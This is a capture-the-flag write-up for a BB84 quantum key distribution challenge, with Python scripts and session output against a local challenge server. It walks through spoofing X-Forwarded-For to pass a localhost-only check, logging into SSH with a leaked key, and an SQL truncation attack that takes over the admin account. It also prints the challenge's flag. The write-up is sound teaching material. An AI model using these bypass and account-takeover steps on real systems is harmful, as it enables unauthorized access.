This challenge is based on the BB84 quantum key distribution protocol.
This is a very nice [article](https://devel0pment.de/?p=1533) to understand it.

We have to make a GET request with 2 parameters, photons and basis.
The server will then randomly generate its own basis to measure bits from these photons.
These bits, server's basis and our basis are then used to calculate a 256-bit AES/ECB encryption key.

The same key is used to encrypt the flag therefore we have to get the key.

```python
import requests
import random
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

bits = [random.choice('01') for _ in range(1024)]
basis = [random.choice('+x') for _ in range(1024)]

params = {'bits': bits, 'basis': basis}
response = requests.get('http://localhost:4000/polarize', json=params)
photons = json.loads(response.text)['photons']

params = {'photons': photons, 'basis': basis}
response = requests.get('http://localhost:4000/flag', json=params)
data = json.loads(response.text)

server_basis = data['basis']
flag = data['flag']

params = {'bits': bits, 'basis_1': basis, 'basis_2': server_basis}
response = requests.get('http://localhost:4000/sharedkey', json=params)
key = json.loads(response.text)['key']

key = b64decode(key.encode())
flag_pt = b64decode(flag.encode())
flag_pt = AES.new(key, AES.MODE_ECB).decrypt(flag_pt)
flag_pt = unpad(flag_pt, AES.block_size).decode()

print(flag_pt)
```

The result is not as expected. Did we calculate the wrong encryption key? Obviously.
But how? The above method is what the BB84 protocol states.

Lets make a GET request once more and see it more closely.

```python
params = {'photons': photons, 'basis': basis}
response = requests.get('http://localhost:4000/flag', json=params)
data = json.loads(response.text)

print(response.headers)
```

Aha! There is some weird text in Set-Cookie header. You know what, its a ROT-13 cipher.
It decodes to a URL to this image:

![eavesdropper](./images/eavesdropper.jpg)

This image has a watermark at bottom-left which says: `i see what you did there`
Clearly the person in the image resembles an eavesdropper and now it adds up.

There is an eavesdropper in the key distribution channel who is intercepting our photons.
But because of the no-cloning theorem, he/she will never calculate the exact same bits as the sender.

So the only way to crack this is by knowing the basis used by the eavesdropper.

What do we do with that text? Maybe it will spook the eavesdropper!

```python
params = {'photons': photons, 'basis': basis}
headers = {'I-See-What-You-Did-There': 'blah'}
response = requests.get('http://localhost:4000', json=params, headers=headers)
data = json.loads(response.text)

print(response.headers)
```

Now there is another headers in response: `You-Saw-Nothing: only localhost is the all-seer`
So it means that this request will get us something useful only when it is made by the localhost itself.
But how can we do that? We are not the ones hosting this CTF!

Actually, we just have to make the server believe that the request is coming from localhost.
That's what the `X-Forwarded-For` HTTP header does. We can spoof our IP address using this.

```python
params = {'photons': photons, 'basis': basis}
headers = {'I-See-What-You-Did-There': 'blah', 'X-Forwarded-For': '127.0.0.1'}
response = requests.get('http://localhost:4000', json=params, headers=headers)
data = json.loads(response.text)

print(response.headers)
```

Boom! We spooked the eavesdropper and now we get two new headers:
*   `Eavesdropper-Bounced-But-Dropped-His-Icecream: 61cbc548dfcb4e99eeaf5b5ee83953aa4d3c3bc20ba7c235aca85d86c4fa9bbf` 
*   `Eavesdropper-Bounced-But-Dropped-His-Keys: "some string"`

Keep these in the back of our minds for now.
Check if there is any other service running on the host other than HTTP listener.
This can be done easily by using `nmap`.

So there is one SSH service too. Lets goooooooo!!!!

```bash
ssh username@host -p xxxx
```

The password is that key which our frightened eavesdropper dropped along with his icecream :(
We are greeted as follows:

```
------------------------------ sniffer-force.onion -----------------------------

Want to do nasty stuff with quantum computers?
Welcome to the sniffers' hangout!

General guidelines:

    *   You can perform 4 actions: "signup", "signin", "signout", "exit".
    *   Strictly follow the command format given below.
    *   username & password should be at least 5 characters long.
    *   username should not contain any special characters. 
    *   Enclose username, email and password in quotation marks.
    *   Signup action- signup "<username>" "<email>" "<password>"
    *   Signin action- signin "<username>" "<password>"
    *   Signout action- signout
    *   Exit action- exit

--------------------------------------------------------------------------------
```

I can smell SQL truncation attack here. Injection doesn't seem to be a good option as any special characters aren't allowed.

First check for the admin account because in most cases that gives us what we want.

```
root@p_ctf:~#  signin 'admin' 'idk_the_pa55w0rd'
USERNAME IS ALREADY IN USE
```

So "admin" is the admin. After trial and error we find out that the maximum length of username is 20 and any string longer than that is truncated to 20 characters.

SQL truncation attack is based on the property that SQL ignores any trailing whitespaces during an insert query. So we will supply a username of length 21 such that all characters between the last one and "admin" are whitespaces.

```
root@p_ctf:~#  signup 'admin          $' 'admin@johndoe.com' 'idk_the_pa55w0rd'
SIGNUP SUCCESSFUL!

root@p_ctf:~#  signin 'admin' 'idk_the_pa55w0rd'
SIGNIN SUCCESSFUL!

How was your icecream?  61cbc548dfcb4e99eeaf5b5ee83953aa4d3c3bc20ba7c235aca85d86c4fa9bbf
It will taste even better with these sprinkles on top.

xx+x++++++xxxx+xx+++xxx+xx++xx+xx+++x+++++++x+x++x+x+x++x++xxxxx+x++x++x+++xx++xx+x+xx++++x+++++xx+xxx++++x+xxx++++xxx+xxx++xx+x+++xxxxxx+xxx+x++xx++++++xxxxxx++x+xxx+x+x++x+xxxxx+x+x+x+xxxxx+xxxx+xx++++xxxx+xxx+++++x+x+++++++++xxx+++x++xx++xx+++xx+x+xxx++++xxx++x+x+++x+x+xxx++xx++xx++xx+xxxx+xxx++++xxxxx+++x+x+x+x++xxxx+++x++x+xxxx++x++x++x++++x+x+x+xxxx+xx++++x+x++++++xx+++++xxx++++x+xx+x++x++++++xxx+x+x+x+x+++x+++x+x+x+++xxxxxxx++x+++xxxxxxxxx++xxxx++xx++xxxxx++x++xx+x+++xxxx++xxxxx+x+x++x+xxxx++x+x+xxx+x+x+++xx+++x+++++++++xxxx++x+x+++xxxxxx+xxx++xx+++xx+xxx+x++x++x++xx+++x+x++++x++xxxxx+xxx++x+x++x++++xxx+xx+++xx+xxx++++x+x++++++++xxxxx++xxx+x++x++xx+++++x+x++xxx+x+++x+x++xx+x+++xx+xxx+++++x+++++xx+xxxxxx++x+xx+++x++xxx++xxxxxx++xxx+x++++x+++x+xx+x++x++x++x++xxx+x++xxx++xxxxxxx+++x++xx++x++x+xxx+x++xxxxxx+xx+x++++xx+++x+++x+xx+xx+xx+++xx+x+xxxxxxx++++xx+++xxxx++x++xxx+xx+x+x++x+++++xxx++++++xxx++x++++xx++++x+++x+x++++++x+x+x+x++x+x++xxx+x+x+xx++x+xx+xx+xx+xxx++xxx+++++x+++xxx+xxxx+x+++xxxxx++x++++xx+x+++
```

This is just what we needed!! Eavesdropper's basis. Now we can calculate the encryption key used by the server. I'll call it "e_basis".

```python
# eavesdropper intercepts our photons and measures them with e_basis
params = {'photons': photons, 'basis': e_basis}
response = requests.get('http://localhost:4000/measure', json=params)
e_bits = json.loads(response.text)['bits']

# eavesdropper polarizes the e_bits with e_basis
params = {'bits': e_bits, 'basis': e_basis}
response = requests.get('http://localhost:4000/polarize', json=params)
e_photons = json.loads(response.text)['photons']

# server receives e_photons and measures them with server_basis
params = {'photons': e_photons, 'basis': server_basis}
response = requests.get('http://localhost:4000/measure', json=params)
server_bits = json.loads(response.text)['bits']

# server calculates the shared key with server_bits, server_basis and basis
params = {'bits': server_bits, 'basis_1': server_basis, 'basis_2': basis}
response = requests.get('http://localhost:4000/sharedkey', json=params)
server_key = json.loads(response.text)['key']

server_key = b64decode(server_key.encode())
flag_pt = b64decode(flag.encode())
flag_pt = AES.new(server_key, AES.MODE_ECB).decrypt(flag_pt)
flag_pt = unpad(flag_pt, AES.block_size).decode()

print(flag_pt)
```

Flag: `p_ctf{c47_15_4l1v3_p0150n_w45_f4k3}`